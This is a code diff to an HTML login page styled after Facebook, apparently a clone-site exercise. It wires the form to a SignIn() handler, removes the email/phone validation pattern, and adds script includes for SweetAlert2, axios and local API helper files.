@@ -17,12 +17,12 @@
             <div class="a-ri8"><span>Facebook helps you connect and share with the people in your life.</span></div>
         </div>
         <div class="form">
-            <form class="a-form">
+            <form class="a-form" id="signInForm">
                 <input type="text" id="EmailOrPhone" class="a-email" name="EmailOrPhone" placeholder="Email address or phone number" 
-                autofocus="autofocus" required pattern="^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$|^\d{10,12}$" />
+                autofocus="autofocus" required/>
                 <input type="password" id="Password" class="a-pss" name="Password" placeholder="Password"
                     autofocus="autofocus" />
-                <input type="submit" class="a-sub" value="Log In" />
+                <input type="submit" class="a-sub" value="Log In" onclick="SignIn()"/>
                 <a href="" class="a-link">Forgotten password?</a>
                 <hr class="a-hr">
                 <a style="text-decoration: none;" href="../layout/fb_signup.html">
@@ -89,5 +89,12 @@
             </div>
         </div>
     </div>
+    <script src="//cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/axios/1.5.1/axios.min.js"
+          integrity="sha512-emSwuKiMyYedRwflbZB2ghzX8Cw8fmNVgZ6yQNNXXagFzFOaQmbvQ1vmDkddHjm5AITcBIZfC7k4ShQSjgPAmQ=="
+          crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+    <script src="../js/class.js"></script>
+    <script src="../services/callApi.js"></script>
+    <script src="../js/signIn.js"></script>
 </body>
 </html>
